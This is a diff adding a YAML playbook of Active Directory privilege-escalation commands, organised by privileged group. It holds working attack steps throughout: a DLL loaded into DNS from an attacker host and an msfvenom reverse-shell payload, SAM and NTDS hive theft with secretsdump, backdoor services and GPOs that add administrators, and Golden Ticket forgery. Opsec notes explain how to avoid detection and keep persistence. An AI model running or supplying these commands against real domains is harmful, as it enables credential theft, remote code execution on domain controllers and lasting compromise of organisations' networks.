@@ -1,0 +1,195 @@
+# Dangerous Groups Abuse Commands
+# Attacks: DNSAdmins, Backup Operators, Server Operators, Print Operators, Account Operators, GPO Creators
+
+DNSAdmins:
+  description: "DNSAdmins group - DLL injection via DNS service for code execution on DC"
+  commands:
+    - name: "Configure malicious DLL (requires DNS restart)"
+      tool: dnscmd
+      command: |
+        dnscmd <DC_FQDN> /config /serverlevelplugindll \\<ATTACKER_IP>\share\malicious.dll
+    - name: "Restart DNS service (if you have rights)"
+      tool: sc
+      command: |
+        sc \\<DC_FQDN> stop dns
+        sc \\<DC_FQDN> start dns
+    - name: "Generate payload DLL"
+      tool: msfvenom
+      command: |
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o malicious.dll
+    - name: "Alternative - Use mimilib.dll for credential logging"
+      tool: Mimikatz
+      command: |
+        # Copy mimilib.dll to share, it logs creds to C:\Windows\System32\kiwissp.log
+        dnscmd <DC_FQDN> /config /serverlevelplugindll \\<ATTACKER_IP>\share\mimilib.dll
+  opsec:
+    - "Requires DNS service restart (may need to wait or have additional privs)"
+    - "DLL path is stored in registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ServerLevelPluginDll"
+    - "DLL runs as SYSTEM on the DC"
+    - "Event ID 770 logged when DNS loads custom DLL"
+
+BackupOperators:
+  description: "Backup Operators - can backup SAM/SYSTEM/NTDS for credential extraction"
+  commands:
+    - name: "Backup SAM and SYSTEM hives"
+      tool: reg
+      command: |
+        reg save HKLM\SAM C:\Temp\SAM
+        reg save HKLM\SYSTEM C:\Temp\SYSTEM
+        reg save HKLM\SECURITY C:\Temp\SECURITY
+    - name: "Extract hashes from SAM"
+      tool: Impacket
+      command: |
+        secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+    - name: "Backup NTDS.dit via diskshadow"
+      tool: diskshadow
+      command: |
+        # Create script.txt with:
+        set context persistent nowriters
+        add volume c: alias someAlias
+        create
+        expose %someAlias% z:
+        # Then run:
+        diskshadow /s script.txt
+        robocopy /b z:\Windows\NTDS . ntds.dit
+    - name: "Backup NTDS.dit via wbadmin"
+      tool: wbadmin
+      command: |
+        wbadmin start backup -backuptarget:\\<ATTACKER_IP>\share -include:c: -quiet
+    - name: "Extract hashes from NTDS"
+      tool: Impacket
+      command: |
+        secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+  opsec:
+    - "Backup operations logged in Windows Event Log"
+    - "VSS snapshots visible via 'vssadmin list shadows'"
+    - "Robocopy with /b flag uses backup semantics"
+    - "May trigger AV/EDR alerts"
+
+ServerOperators:
+  description: "Server Operators - can modify services for code execution"
+  commands:
+    - name: "Modify existing service binary path"
+      tool: sc
+      command: |
+        sc \\<TARGET> config <SERVICE_NAME> binPath= "C:\Windows\Temp\payload.exe"
+        sc \\<TARGET> stop <SERVICE_NAME>
+        sc \\<TARGET> start <SERVICE_NAME>
+    - name: "Create new service"
+      tool: sc
+      command: |
+        sc \\<TARGET> create EvilSvc binPath= "C:\Windows\Temp\payload.exe" start= auto
+        sc \\<TARGET> start EvilSvc
+    - name: "Modify service with cmd execution"
+      tool: sc
+      command: |
+        sc \\<TARGET> config <SERVICE_NAME> binPath= "cmd /c net localgroup Administrators <USER> /add"
+  opsec:
+    - "Service changes create Event ID 7045 (new service) or 7040 (config change)"
+    - "Modifying critical services may cause system instability"
+    - "Choose non-essential services for modification"
+
+PrintOperators:
+  description: "Print Operators - can load printer drivers (kernel code execution on older systems)"
+  commands:
+    - name: "Add malicious printer driver"
+      tool: PowerShell
+      command: |
+        Add-PrinterDriver -Name "Evil Driver" -InfPath "\\<ATTACKER_IP>\share\evil.inf"
+    - name: "Note - legacy attack"
+      tool: note
+      command: |
+        # This attack is largely mitigated on modern Windows
+        # Print Operators can still:
+        # - Manage printers and print queues
+        # - Load drivers on older systems (pre-2016)
+        # - Access print servers
+  opsec:
+    - "Driver installation logged in Event Log"
+    - "Modern Windows requires signed drivers"
+    - "Limited value on patched systems"
+
+AccountOperators:
+  description: "Account Operators - can manage non-admin users and groups"
+  commands:
+    - name: "Reset non-admin user password"
+      tool: net
+      command: |
+        net user <TARGET_USER> <NEW_PASSWORD> /domain
+    - name: "Add user to non-admin group"
+      tool: net
+      command: |
+        net group "<TARGET_GROUP>" <USER> /add /domain
+    - name: "Create new user"
+      tool: net
+      command: |
+        net user <NEW_USER> <PASSWORD> /add /domain
+    - name: "Reset password via bloodyAD"
+      tool: bloodyAD
+      command: |
+        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set password <TARGET_USER> '<NEW_PASSWORD>'
+  opsec:
+    - "Cannot manage admin accounts or privileged groups"
+    - "User/group changes create Event ID 4720/4722/4728"
+    - "Useful for persistence via non-obvious accounts"
+
+GPOCreators:
+  description: "Group Policy Creator Owners - can create new GPOs"
+  commands:
+    - name: "Create malicious GPO"
+      tool: SharpGPOAbuse
+      command: |
+        SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators <USER> /add" --GPOName "<NEW_GPO_NAME>"
+    - name: "Create GPO via PowerShell"
+      tool: PowerShell
+      command: |
+        New-GPO -Name "EvilGPO"
+        # Then use SharpGPOAbuse or pyGPOAbuse to add malicious content
+    - name: "Abuse existing GPO if you can link it"
+      tool: pyGPOAbuse
+      command: |
+        pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<GPO_ID>' -command 'powershell.exe -enc <PAYLOAD>' -f
+  opsec:
+    - "GPO creation logged in Event Log"
+    - "Created GPO must be linked to an OU to take effect"
+    - "GPO changes replicate across domain"
+
+SchemaAdmins:
+  description: "Schema Admins - can modify AD schema (persistence)"
+  commands:
+    - name: "Note on Schema modification"
+      tool: note
+      command: |
+        # Schema modifications are IRREVERSIBLE
+        # Can be used for advanced persistence:
+        # - Add custom attributes to store backdoor data
+        # - Modify existing attribute behavior
+        # Only proceed if you understand the implications
+    - name: "View current schema"
+      tool: ldapsearch
+      command: |
+        ldapsearch -x -H ldap://<DC_IP> -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b 'CN=Schema,CN=Configuration,DC=<DOMAIN>' '(objectClass=attributeSchema)'
+  opsec:
+    - "Schema changes are permanent and replicate forest-wide"
+    - "Highly visible and should rarely be used"
+    - "Creates Event ID 5136 with schema-specific GUIDs"
+
+EnterpriseAdmins:
+  description: "Enterprise Admins - forest-wide administrative access"
+  commands:
+    - name: "DCSync any domain in forest"
+      tool: Impacket
+      command: |
+        secretsdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<ANY_DC_IN_FOREST>
+    - name: "Access any domain controller"
+      tool: Impacket
+      command: |
+        psexec.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<ANY_DC_IN_FOREST>
+    - name: "Create cross-domain persistence"
+      tool: Mimikatz
+      command: |
+        # Create Golden Ticket with Enterprise Admin SID
+        kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /krbtgt:<KRBTGT_HASH> /ticket:golden.kirbi
+  opsec:
+    - "Full forest access - same as Domain Admins but cross-domain"
+    - "All attacks logged as admin operations"
